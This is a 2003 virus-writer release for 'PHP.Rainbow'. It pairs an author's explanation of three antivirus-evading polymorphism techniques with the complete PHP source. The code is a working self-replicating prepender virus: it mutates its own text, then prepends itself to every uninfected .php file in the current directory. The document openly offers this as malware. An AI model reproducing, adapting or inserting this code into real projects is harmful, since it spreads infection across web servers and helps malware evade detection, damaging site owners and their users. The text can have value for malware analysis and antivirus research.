  PHP.Rainbow
  by Second Part To Hell[rRlf]
  www.spth.de.vu
  spth@aonmail.at
  written in october 2003
  in Austria

  You're looking at my very first PHP virus, but don't be sad, it's a really good one :)
  First I want to tell you something about the features of the virus, that I'll give
  you some Information about the technique of the features.
  OK, it's a Prepender PHP virus, which uses three polymorphism tecniques. The poly engine
  are totally new, because I've never seen any other poly PHP virus (Kefi did one in
  the meantime, but I haven't seen it so far). As I told you, there are three different
  Polymorphism techniques, I'm sure that you want to know more about them :) First engine
  adds trash/garbage/junk (however you wanna call it) to the code, the second one changes
  15 variable/function names. And the last one changes numbers. Now let's have a look at
  the better explanation, not this shourt summary :)

  Technique Information:

    * Poly Engines

      --> Adding Trash/Junk/Garbage
		The Virus adds ine in two lines a junk line to the code.
		This Junk-line could contain:
		- // anything
		- $anything='anything';
		- $anything=number;
		Because the code would be damn big after the 5th generation, I desided
		to delete the trash after every generation and make a new one. Anyway,
		the chance to get a trash-line will be bigger, because there are more
		lines (more lines --> more chance). But I tested about 30 generation
		and it's no big problem with the size.

      --> Changing Variable/function names
		The Virus uses an array with all variable/function names of the virus,
		every generation it changes every array-entry (every name) to a 5-15
		sign long new name.

      --> Number changing
		The virus is able to change every number in the code. This is a real
		successfull way to fake AVs, i think! A number (for instands '10') could
		also be one of the following things:
		10=(8+2)
		10=(19-9)
		10=(130/13)
		It's easy to understand, I think. I desided to change ever 5th number I can
		find, because it looks better than changing every number every generation.


    * Infection Method

      --> Prepender
		This code is a prepender virus, which doesn't harm the victim file.
		It reads the first PHP part (which is the whole virus code) of the current
		file (__FILE__, as it's called in PHP). Than it searchs for every PHP-files
		in the current directory, and adds the changed virus code at the beginn of
		the victim file. Before infecting the virus checks, if there's already an 
		infection mark or the virus, which is 'RainBow'.

  Something else little interesting is, that it's hard to get many different generations from
  the virus, because it just changes, if it infects a file. And just the infected file has the
  different form, not the old virus. That's a little trick, which I read in an article about
  Polymorphism by SnakeByte. He wrote, that it will use more time to get many generations, which
  is a problem for AVs (who needs many generations :D).

	In the end I want to thank the following people, which made it possible, that I
	wrote this virus :)

	- Fugo		<-- Guy from school, PHP expert but non viral stuff :(
			    Much thanks for the information you gave me in PHP!

	- www.php.net & www.apachefriends.com	<-- Great PHP information!!!

	- MaskBits/VXI	<-- Writing the first real PHP maleware (released in 29A#5)

	- PhileT0Ast3r	<-- Telling me, that Kefi also writes a PHP poly virus

	- Kefi		<-- for also writing a PHP poly virus :D

	- Theatre Of Tragedy | Darkfall		<-- for the great sounds!!!

	- Cigarettes | Beer	<-- for helping me to don't commit suicide while searching
				    for the bugs in this little thing :)

  Maybe you wanna know, why I gave this name. I won't tell you, but the person, where the name
  comes from, should understand it ;)
  Execute this virus with PHP 4.3.3 + PEAR. I did it, and it worked really fine!

--------------------------------------< PHP.RainBow >--------------------------------------
<?php // RainBow
srand((double)microtime()*1000000);
 $changevars=array('changevars','string','newcont','curdir','filea','victim','viccont','newvars','returnvar','counti','countj','trash','allcont','number','remn');
 $string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
 $newcont='<?php // RainBow'.chr(13).chr(10);
while ($string && $string!='?>'){
if(rand(0,1)){
if(rand(0,1)){$newcont.='// '.trash('',0).chr(13).chr(10);}
if(rand(0,1)){$newcont.='$'.trash('',0).'='.chr(39).trash('',0).chr(39).';'.chr(13).chr(10);}
if(rand(0,1)){$newcont.='$'.trash('',0).'='.rand().';'.chr(13).chr(10);}}
 $string=strtok(chr(13).chr(10));
if($string{0}!='/' && $string{0}!='$'){$newcont.=$string.chr(13).chr(10);}}
 $counti=0;
while($changevars[$counti]){
 $newcont=str_replace($changevars[$counti++],trash('',0),$newcont);}
 $countj=-1; $number='';
while(++$countj<strlen($newcont)){
if (ord($newcont{$countj})>47&&ord($newcont{$countj})<58){
 $number=$newcont{$countj};
while(ord($newcont{++$countj})>47&&ord($newcont{$countj})<58){$number.=$newcont{$countj};}
 $remn=rand(1,10);
if (!rand(0,5)){switch(rand(1,3)){case 1:$allcont.='('.($number-$remn).'+'.$remn.')';break;
case 2:$allcont.='('.($number+$remn).'-'.$remn.')';break;
case 3:$allcont.='('.($number*$remn).'/'.$remn.')';break;}}else{$allcont.=$number;}}
 $allcont.=$newcont{$countj};$number='';}
 $curdir=opendir('.');
while($filea=readdir($curdir)){
if(strstr($filea,'.php')){$victim=fopen($filea,'r+');
if (!strstr(fread($victim, 25),'RainBow')){rewind($victim);
 $viccont=fread($victim,filesize($filea));
rewind($victim);
fwrite($victim,$allcont.$viccont);}
fclose($victim);}}
closedir($curdir);
function trash($returnvar, $countj){
do{$returnvar.=chr(rand(97,122));}while($countj++<rand(5,15));
return $returnvar;}
?>
